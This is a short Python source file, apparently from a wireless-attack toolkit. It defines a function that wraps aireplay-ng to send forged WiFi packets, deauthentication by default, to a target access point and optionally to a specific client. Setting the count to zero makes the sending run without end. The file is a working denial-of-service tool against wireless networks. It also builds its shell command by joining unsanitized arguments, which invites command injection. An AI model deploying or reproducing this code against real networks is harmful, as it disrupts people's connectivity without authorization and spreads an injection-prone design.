# libs
from lib.GPL.Command_Managers import gpl_run_OS_command, return_ERROR_if_error
from lib.config.GPL import AirCrack_More_Arguments_Fake_Packet
from lib.config.WiFi_Fake_Packets import Packets


# send fake deauth packet
#
# internal modules:
# gpl_run_OS_command
#
# NOTE:
# if Count=0, it's not will stop and return
#
# version:
# 1
def gpl_wifi_packet(AP_BSSID, Packet_Type=Packets.Deauth, Client_BSSID=None, Count=1, Interface='wlan0'):
    if Client_BSSID:
        Result = gpl_run_OS_command('aireplay-ng ' + AirCrack_More_Arguments_Fake_Packet + ' -' + str(Packet_Type) + ' ' + str(Count) + ' -a ' + AP_BSSID + ' -c ' + Client_BSSID + ' ' + Interface + return_ERROR_if_error)
    else:
        Result = gpl_run_OS_command('aireplay-ng ' + AirCrack_More_Arguments_Fake_Packet + ' -' + str(Packet_Type) + ' ' + str(Count) + ' -a ' + AP_BSSID + ' ' + Interface + return_ERROR_if_error)
    if Result == 'ERROR':
        return False
    else:
        return True